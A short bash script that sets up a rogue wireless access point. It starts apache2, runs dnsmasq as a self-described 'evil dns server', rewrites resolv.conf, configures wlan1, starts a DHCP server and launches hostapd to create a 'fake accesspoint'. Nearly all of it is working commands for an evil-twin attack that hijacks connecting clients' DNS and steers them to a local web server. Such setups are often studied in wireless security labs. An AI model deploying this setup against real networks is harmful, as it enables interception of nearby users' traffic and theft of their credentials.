#!/bin/bash
echo -e "-------------- starting the relevant services --------------\n"

service apache2 start

echo -e "-------------- apache2 web server is up --------------\n"

service dnsmasq start

echo -e "-------------- evil dns server is listening on port 53 -> modefiting the dns configeration --------------\n"

echo nameserver 127.0.0.1 > /etc/resolv.conf

echo -e "-------------- setting wlan1 ip address and routing tables --------------\n"

ifconfig wlan1 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

echo -e "-------------- starting dhcp server --------------\n\n"
dhcpd

echo -e "\n-------------- creating the fake accesspoint --------------\n\n"
hostapd hostapd.conf

